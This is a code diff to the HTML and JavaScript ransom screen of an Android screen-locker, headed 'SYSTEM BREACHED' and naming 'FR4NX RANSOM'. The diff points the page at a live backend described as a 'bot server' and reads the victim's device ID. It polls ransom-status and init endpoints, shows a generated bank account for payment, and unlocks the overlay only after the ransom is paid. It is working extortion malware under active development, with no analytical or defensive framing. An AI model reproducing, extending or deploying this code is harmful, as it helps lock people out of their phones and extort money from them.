@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="theme-color" content="#050000">
 <title>SYSTEM BREACHED</title>
 
 <style>
@@ -168,7 +167,7 @@ button,input { font:inherit; }
         <!-- This box displays the generated bank account -->
         <div class="v-account" id="virtualAccountBox">
             <p>Transfer to this dedicated account:</p>
-            <h3 id="vAccountNumber">1234567890</h3>
+            <h3 id="vAccountNumber">...</h3>
             <span id="vBankName">Wema Bank</span> - <span id="vAccountName">FR4NX RANSOM</span>
         </div>
     </section>
@@ -233,7 +232,7 @@ resizeCanvas(); drawParticles();
 // ==========================================
 // 2. Backend & Paystack Logic
 // ==========================================
-const BACKEND_URL = "https://your-backend-url.com"; // <--- IMPORTANT: PUT YOUR PYTHON BACKEND URL HERE
+const BACKEND_URL = "https://fr4nx.wisp.uno"; // <--- YOUR LIVE BOT SERVER
 let deviceId = Android.getDeviceId();
 let hasUnlocked = false;
 let accountGenerated = false;
@@ -241,7 +240,7 @@ let accountGenerated = false;
 function checkPaymentStatus() {
     if (hasUnlocked) return;
     
-    fetch(`${BACKEND_URL}/check_status/${deviceId}`)
+    fetch(`${BACKEND_URL}/api/ransom/status?device_id=${deviceId}`)
         .then(res => res.json())
         .then(data => {
             if (data.status === "unlocked") {
@@ -249,7 +248,7 @@ function checkPaymentStatus() {
                 document.getElementById("payButton").innerText = "PAYMENT RECEIVED. DECRYPTING...";
                 document.getElementById("payButton").disabled = true;
                 setTimeout(() => { Android.unlockOverlay(); }, 2000);
-            } else {
+            } else if (data.ok) {
                 let paid = data.amount_paid / 100;
                 let target = data.target / 100;
                 
@@ -267,7 +266,8 @@ function checkPaymentStatus() {
                     document.getElementById("vAccountNumber").innerText = data.virtual_account.account_number;
                     document.getElementById("vBankName").innerText = data.virtual_account.bank_name;
                     document.getElementById("vAccountName").innerText = data.virtual_account.account_name;
-                    document.getElementById("payButton").innerText = "OPEN PAYSTACK CHECKOUT";
+                    document.getElementById("payButton").innerText = "WAITING FOR TRANSFER...";
+                    document.getElementById("payButton").disabled = true;
                 }
             }
         }).catch(e => console.log("Polling error:", e));
@@ -278,14 +278,17 @@ checkPaymentStatus(); // Run immediately on load
 
 function payNow() {
     const btn = document.getElementById("payButton");
-    btn.innerText = "CONNECTING TO SECURE GATEWAY...";
+    btn.innerText = "GENERATING ACCOUNT...";
     
-    fetch(`${BACKEND_URL}/initiate_payment/${deviceId}`)
+    fetch(`${BACKEND_URL}/api/ransom/init?device_id=${deviceId}`)
         .then(res => res.json())
         .then(data => {
-            btn.innerText = "OPEN PAYSTACK CHECKOUT";
-            if (data.url) {
-                window.location.href = data.url; // Opens Paystack Checkout
+            if (data.ok) {
+                checkPaymentStatus(); // Trigger UI update
+                btn.innerText = "WAITING FOR TRANSFER...";
+                btn.disabled = true;
+            } else {
+                btn.innerText = "NETWORK ERROR. TRY AGAIN.";
             }
         }).catch(e => {
             btn.innerText = "NETWORK ERROR. TRY AGAIN.";
